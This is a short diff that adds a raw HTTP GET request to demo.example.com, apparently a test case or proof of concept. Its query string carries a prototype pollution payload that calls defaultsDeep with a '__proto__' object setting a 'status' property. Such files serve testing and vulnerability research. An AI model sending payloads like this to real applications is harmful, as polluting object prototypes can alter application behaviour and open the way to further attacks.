@@ -1,0 +1,4 @@
+GET /a?input=defaultsDeep({},{\u0022__proto__\u0022:{\u0022status\u0022:5}}) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
